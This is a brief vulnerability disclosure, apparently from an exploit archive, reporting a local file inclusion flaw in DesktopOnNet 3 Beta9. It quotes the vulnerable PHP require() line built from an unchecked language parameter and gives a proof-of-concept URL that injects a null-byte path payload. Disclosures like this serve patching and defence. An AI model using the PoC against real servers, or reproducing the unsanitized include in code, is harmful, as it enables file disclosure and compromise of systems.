@@ -1,0 +1,18 @@
+[+] DesktopOnNet 3 Beta9 Local File Include Vulnerability
+[+] Discovered By: cr4wl3r
+[+] Download: http://sourceforge.net/projects/don3/files/
+[x] Code in [DON3/applications/don3_toolbox.don3app/don3_toolbox.php]
+
+require("appfiles/languages/$don3_lang.php"); <--- LFI
+if (!file_exists('library/don3_toolbox.don3lib')){
+don3_do_don3lib("DON3: ToolBox;window;M;", "don3_toolbox");
+}
+$item = $_GET["ac"];
+$toolbox_path = $app_path;
+if (array_key_exists($item, $don3_toolbox_overview_words)){
+$currently = $don3_toolbox_overview_words[$item];
+} else {
+$currently = $don3_toolbox_overview_words["start"];
+}
+
+[+] PoC: [path]/applications/don3_toolbox.don3app/don3_toolbox.php?don3_lang=[LFI%00]
